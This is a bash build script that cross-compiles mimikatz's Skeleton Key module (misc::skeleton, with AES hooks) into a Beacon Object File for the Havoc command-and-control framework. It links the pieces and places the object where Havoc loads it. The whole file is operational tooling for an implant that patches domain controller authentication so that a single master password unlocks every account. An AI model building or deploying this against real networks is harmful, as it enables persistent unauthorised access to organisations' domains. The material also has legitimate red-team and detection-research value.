#!/usr/bin/env bash
# build.sh — skeletonkey BOF (mimikatz misc::skeleton, any-password).
set -euo pipefail

M="x86_64-w64-mingw32"
CC="${M}-gcc"; LD="${M}-ld"; OBJCOPY="${M}-objcopy"

BIN_DIR="$(cd "$(dirname "$0")" && pwd)"
MIK="$BIN_DIR/.."
OUT="$BIN_DIR/obj"; mkdir -p "$OUT"

CFLAGS=(
  -c -Os -fcommon -fno-stack-protector -fno-asynchronous-unwind-tables
  -fno-toplevel-reorder
  -mno-stack-arg-probe -ffreestanding -std=gnu17 -w
  -Wno-error=incompatible-pointer-types -Wno-error=int-conversion
  -Wno-error=implicit-function-declaration
  -DUNICODE -D_UNICODE -D_WIN64 -D_WIN32_WINNT=0x0603
  -include "$BIN_DIR/bof_compat.h"
  -include "$BIN_DIR/bof_dfr.h"
  -I"$BIN_DIR/casefix" -I"$MIK/inc" -I"$MIK/modules" -I"$MIK/mimikatz/modules" -I"$BIN_DIR"
)

cc() { "$CC" "${CFLAGS[@]}" -o "$2" "$1" && echo "  [cc] $(basename "$1")"; }
link() { local out="$1"; shift; "$LD" -r -o "$out" "$@"; "$OBJCOPY" --strip-debug "$out" 2>/dev/null || true; echo "  [ld] $out"; }

SHIMS=("$OUT/crt_shim.o" "$OUT/bof_output.o" "$OUT/go_common.o" "$OUT/stubs.o" "$OUT/bof_resolve.o" "$OUT/bof_globals.o")

echo "== shims =="
cc "$BIN_DIR/crt_shim.c"     "$OUT/crt_shim.o"
cc "$BIN_DIR/bof_output.c"   "$OUT/bof_output.o"
cc "$BIN_DIR/go_common.c"    "$OUT/go_common.o"
cc "$BIN_DIR/stubs.c"        "$OUT/stubs.o"
cc "$BIN_DIR/bof_resolve.c"  "$OUT/bof_resolve.o"
cc "$BIN_DIR/bof_globals.c"  "$OUT/bof_globals.o"

case "${1:-skeleton}" in
  skeleton)
    echo "== skeleton (skeletonkey) =="
    # entry point
    cc "$BIN_DIR/skeleton_bof.c" "$OUT/skeleton_bof.o"

    # shared kull_m_* TUs
    TUS=( kull_m_process kull_m_memory kull_m_remotelib kull_m_string
          kull_m_crypto kull_m_patch kull_m_file kull_m_handle
          kull_m_net kull_m_token kull_m_service kull_m_kernel )
    for t in "${TUS[@]}"; do
      [ -f "$MIK/modules/$t.c" ] && cc "$MIK/modules/$t.c" "$OUT/$t.o"
    done

    # the AES all-users skeleton key (derive-layer input substitution + arm
    # table). Hooks are pre-compiled PIC blobs embedded as headers, so this TU
    # is ordinary C — no -fno-pic needed.
    echo "  [cc] kuhl_m_skeleton_aes.c"
    "$CC" "${CFLAGS[@]}" -o "$OUT/kuhl_m_skeleton_aes.o" "$MIK/mimikatz/modules/kuhl_m_skeleton_aes.c"

    OBJS=("${SHIMS[@]}" "$OUT/skeleton_bof.o" "$OUT/kuhl_m_skeleton_aes.o")
    for t in "${TUS[@]}"; do [ -f "$OUT/$t.o" ] && OBJS+=("$OUT/$t.o"); done
    link "$BIN_DIR/skeletonTicket_bof.o" "${OBJS[@]}"
    echo "  -> skeletonTicket_bof.o ($(stat -c%s "$BIN_DIR/skeletonTicket_bof.o") bytes)"

    # Havoc loads the BOF from bin/skeletonTicket.<arch>.o (see skeletonkey.py).
    mkdir -p "$MIK/bin"
    cp "$BIN_DIR/skeletonTicket_bof.o" "$MIK/bin/skeletonTicket.x64.o"
    echo "  -> bin/skeletonTicket.x64.o ($(stat -c%s "$MIK/bin/skeletonTicket.x64.o") bytes)"
    python3 "$BIN_DIR/verify_blob.py" "$MIK/bin/skeletonTicket.x64.o"
    ;;
esac

echo "== done =="
